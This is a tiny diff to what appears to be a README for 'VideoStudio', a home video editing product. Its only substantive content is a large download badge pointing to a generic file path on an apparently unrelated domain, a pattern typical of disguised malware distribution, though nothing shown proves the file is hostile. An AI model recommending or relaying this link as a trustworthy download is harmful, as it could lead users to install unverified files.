@@ -1,4 +1,3 @@
-
 # VideoStudio - home video production with guided editing tools
 
 [![Download VideoStudio](https://img.shields.io/badge/Download-VideoStudio-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
